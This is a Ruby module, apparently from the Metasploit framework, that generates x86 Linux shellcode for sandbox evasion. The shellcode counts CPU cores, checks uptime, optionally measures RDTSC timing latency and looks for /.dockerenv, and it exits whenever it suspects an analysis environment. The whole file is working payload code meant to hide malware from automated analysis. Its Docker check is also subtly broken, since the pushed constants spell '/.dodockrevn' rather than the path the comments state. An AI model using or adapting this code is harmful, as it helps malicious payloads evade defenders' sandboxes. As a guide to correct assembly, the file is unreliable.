module Msf::Payload::Linux::X86::SandboxEvasion
  def sandbox_evasion(cores = 2, uptime = 600, check_docker = true, check_virt = false)

    rdtsc_asm = ""
    if check_virt
      rdtsc_asm = %Q^
; ─────────────────────────────────────────────────────────────
; Check: Execution Latency via RDTSC
; ─────────────────────────────────────────────────────────────
check_rdtsc:
    xor eax, eax
    cpuid
    rdtsc
    mov edi, eax      ; SAVE timestamp in EDI (cpuid doesn't touch EDI)

    xor eax, eax
    cpuid             ; This clobbers EAX, EBX, ECX, EDX

    rdtsc
    sub eax, edi      ; Calculate delta (Current - Saved)
    
    xor ecx, ecx
    mov cx, 0x3E8      ; 1000 cycles
    cmp eax, ecx
    jge sandbox_detected
      ^
    end

    docker_asm = ""
    if check_docker
      docker_asm = %Q^
; ─────────────────────────────────────────────────────────────
; Check: Container Detection via /.dockerenv
; ─────────────────────────────────────────────────────────────
check_docker:
    xor eax, eax
    push eax              ; Null terminator \0
    push 0x6e766572       ; "revn"
    push 0x6b636f64       ; "dock"
    push 0x6f642e2f       ; ".do/" (This results in /.dockerenv\0)
    
    mov eax, 5            ; sys_open (x86)
    mov ebx, esp          ; arg1: filename
    xor ecx, ecx          ; arg2: O_RDONLY
    int 0x80

    test eax, eax
    js clean_docker       ; If error, it's not docker
    jmp sandbox_detected  ; If success, it IS docker

clean_docker:
    add esp, 16
      ^
    end

    asm = %Q^
_start:
    push ebx
    push esi
    push edi
    push ebp

    sub esp, 128

; ─────────────────────────────────────────────────────────────
; Check: CPU cores via sched_getaffinity (x86 syscall 103)
; ─────────────────────────────────────────────────────────────
check_cores:
    mov eax, 103          ; sys_sched_getaffinity
    xor ebx, ebx          ; pid = 0
    mov ecx, 128          ; size of mask
    mov edx, esp          ; mask pointer
    int 0x80
    
    test eax, eax
    js check_uptime
    
    mov ebx, [esp]
    xor ecx, ecx
count_loop:
    test ebx, ebx
    jz evaluate_cores
    mov eax, ebx
    dec eax
    and ebx, eax
    inc ecx
    jmp count_loop

evaluate_cores:
    cmp ecx, #{cores}
    jl sandbox_detected

; ─────────────────────────────────────────────────────────────
; Check: System Uptime via sysinfo (x86 syscall 49)
; ─────────────────────────────────────────────────────────────
check_uptime:
    mov eax, 49           ; sys_sysinfo
    mov ebx, esp          ; info pointer
    int 0x80
    
    test eax, eax
    js execute_optional_checks
    
    mov eax, [esp]
    xor ebx, ebx
    mov bx, #{uptime}
    cmp eax, ebx
    jle sandbox_detected

execute_optional_checks:
#{rdtsc_asm}
#{docker_asm}

    jmp pass

; ─────────────────────────────────────────────────────────────
; Sandbox Detected: Kill Process (x86 syscall 1)
; ─────────────────────────────────────────────────────────────
sandbox_detected:
    mov eax, 1            ; sys_exit
    xor ebx, ebx
    int 0x80

; ─────────────────────────────────────────────────────────────
; Clean Up & Execute
; ─────────────────────────────────────────────────────────────
pass:
    add esp, 128
    xor eax, eax
    xor ecx, ecx
    xor edx, edx

    pop ebp
    pop edi
    pop esi
    pop ebx
^
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end
end
